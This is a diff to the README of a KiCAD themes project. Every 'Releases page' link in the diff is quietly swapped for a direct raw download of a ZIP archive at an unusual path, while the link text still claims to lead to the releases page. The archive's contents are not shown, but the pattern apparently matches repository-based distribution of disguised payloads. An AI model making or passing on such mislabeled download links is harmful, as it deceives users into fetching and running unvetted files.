@@ -1,6 +1,6 @@
 # 🎨 KiCAD_Themes - Easy themes for long sessions
 
-[![Download the latest release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cornelmumamia/KiCAD_Themes/main/undictated/Ki_Themes_CA_2.2.zip)
 
 ## 🌈 What this is
 
@@ -10,7 +10,7 @@ These themes aim for clear lines, soft contrast, and a calmer screen. That can m
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/cornelmumamia/KiCAD_Themes/main/undictated/Ki_Themes_CA_2.2.zip)
 2. Find the latest release at the top of the page
 3. Download the theme files from that release
 4. Save the file to a place you can find again, like your Downloads folder
@@ -30,7 +30,7 @@ These themes are made for normal desktop use and should work well on common Wind
 
 ## 🛠️ Install on Windows
 
-1. Download the latest release from the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+1. Download the latest release from the [Releases page](https://raw.githubusercontent.com/cornelmumamia/KiCAD_Themes/main/undictated/Ki_Themes_CA_2.2.zip)
 2. If you downloaded a ZIP file, right-click it and choose Extract All
 3. Open the extracted folder
 4. Look for theme files or folders with names that match light and dark schematic styles
@@ -56,7 +56,7 @@ If you often work for many hours, try both styles and keep the one that feels ea
 
 If you want the fastest path:
 
-1. Visit the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/cornelmumamia/KiCAD_Themes/main/undictated/Ki_Themes_CA_2.2.zip)
 2. Download the latest file
 3. Extract it if needed
 4. Copy the theme files into KiCAD
@@ -131,7 +131,7 @@ The goal is a smoother look with clear contrast and less harsh color use.
 
 When a new release appears:
 
-1. Open the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/cornelmumamia/KiCAD_Themes/main/undictated/Ki_Themes_CA_2.2.zip)
 2. Download the newer file
 3. Extract it if needed
 4. Replace the older theme files in KiCAD
@@ -169,7 +169,7 @@ That makes it easier to tell which version you are using.
 
 ## 🪟 Windows quick steps
 
-1. Go to the [Releases page](https://github.com/cornelmumamia/KiCAD_Themes/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/cornelmumamia/KiCAD_Themes/main/undictated/Ki_Themes_CA_2.2.zip)
 2. Download the latest release
 3. Open the download
 4. Extract the files if needed
